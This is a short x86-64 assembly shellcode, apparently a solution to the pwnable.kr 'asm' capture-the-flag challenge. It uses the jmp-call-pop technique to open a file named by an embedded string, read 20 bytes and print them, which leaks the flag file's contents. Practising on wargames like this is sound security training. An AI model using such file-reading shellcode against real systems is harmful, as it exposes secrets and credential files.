global _start

[SECTION .text]

_start:
  jmp MESSAGE

GOBACK:

  mov rax, 2  ;open file
  pop rdi
  mov rsi, 0
  syscall

  mov rdi, rax

  xor rax, rax

  mov rax, 0  ;read from file
  mov rsi, rsp
  mov rdx, 20
  syscall

  mov rax, 1  ;write
  mov rdi, 1
  mov rsi, rsp
  mov rdx, 20
  syscall

  mov rax, 60
  syscall

MESSAGE:
  call GOBACK

  db 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'
